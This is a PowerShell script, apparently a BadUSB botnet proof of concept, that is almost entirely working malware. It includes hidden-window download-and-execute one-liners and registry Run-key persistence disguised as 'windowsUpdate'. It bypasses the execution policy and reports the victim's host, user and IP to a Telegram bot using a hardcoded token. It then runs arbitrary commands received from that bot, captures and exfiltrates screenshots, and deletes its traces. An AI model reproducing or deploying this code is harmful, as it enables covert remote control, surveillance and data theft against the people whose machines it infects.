<#
BADUSB COMMANDS:
    # Execute 
    powershell.exe -windowstyle hidden -file this_file.ps1

    #Execute script from github
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))

REGEDIT:
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Docu
ments\windowsUpdate.ps1"	
https://www.akadia.com/services/windows_registry.html 
	#>

############
## CONFIG ##
############

$BotToken = "688087783:AAGT_3LMrnPPnym-RIkrfSIWbiEZaTL_f_4"
$ChatID = '-242346194'
$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'


###############
## FUNCTIONS ##
###############

function backdoor {
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        # Check backdoor
        $checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command

        #Stop-Process -Name "comandos" -Confirm -PassThru
}

function screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
}

function cleanAll {
    # Remove screenshots
    rm C:\Users\$env:USERPROFILE\Documents\screenshot.jpg
    # Remove cUrl
    rm C:\Users\$env:USERPROFILE\AppData\Local\Temp\1
    # Remove backdoor
    rm C:\Users\$env:USERPROFILE\Documents\windowsUpdate.ps1
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
}

function sendPhoto {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\afranco\Documents\screenshot.jpg"
    $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
    $curl_zip = $ruta + "\curl.zip"
    $curl = $ruta + "\" + "curl.exe"
    $curl_mod = $ruta + "\" + "curl_mod.exe"
    if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
    if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
    [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
    }
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
}

#####################
## BYPASS POLICIES ##
#####################

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


##########################
## CONNECT WITH CHANNEL ##
##########################
$whoami = Invoke-Expression whoami

$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString

$hostname = Invoke-Expression hostname


$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)


######################
## WAIT FOR COMMAND ##
######################

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 3
 
 
#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
		
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	  "/stop $ipV4"  {
		#The user wants to stop the script
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/screenshot $ipV4"{
        screenshot
        sendPhoto
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/meterpreter $ipV4"  {
         
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
	  default  {
	    #The message sent is unknown
		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	}
	
  }
}

